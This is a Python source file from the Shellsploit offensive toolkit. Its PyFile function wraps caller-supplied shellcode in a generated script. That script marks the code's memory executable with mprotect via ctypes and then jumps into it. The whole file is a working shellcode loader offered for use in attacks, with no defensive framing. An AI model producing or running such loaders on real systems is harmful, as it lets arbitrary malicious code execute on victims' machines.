#------------------Bombermans Team---------------------------------# 
#Author  : B3mB4m
#Concat  : b3mb4m@protonmail.com
#Project : https://github.com/b3mb4m/Shellsploit
#LICENSE : https://github.com/b3mb4m/Shellsploit/blob/master/LICENSE
#------------------------------------------------------------------#

def PyFile( shellcode):
	import time
	db = """#!/usr/bin/python

import ctypes
import multiprocessing

#Project : https://github.com/b3mb4m/Shellsploit
#This file created with shellsploit ..
#%s - %s


shellcode_data = (b"%s")

shellcode = ctypes.c_char_p(shellcode_data)
function = ctypes.cast(shellcode, ctypes.CFUNCTYPE(None))
addr = ctypes.cast(function, ctypes.c_void_p).value
libc = ctypes.CDLL('libc.so.6')
pagesize = libc.getpagesize()
addr_page = (addr // pagesize) * pagesize

for page_start in range(addr_page, addr + len(shellcode_data), pagesize):
    assert libc.mprotect(page_start, pagesize, 0x7) == 0
function()   
""" % (time.strftime("%d/%m/%Y"), time.strftime("%H:%M:%S"), shellcode)

	from logger import logs
	logs( db, "py")



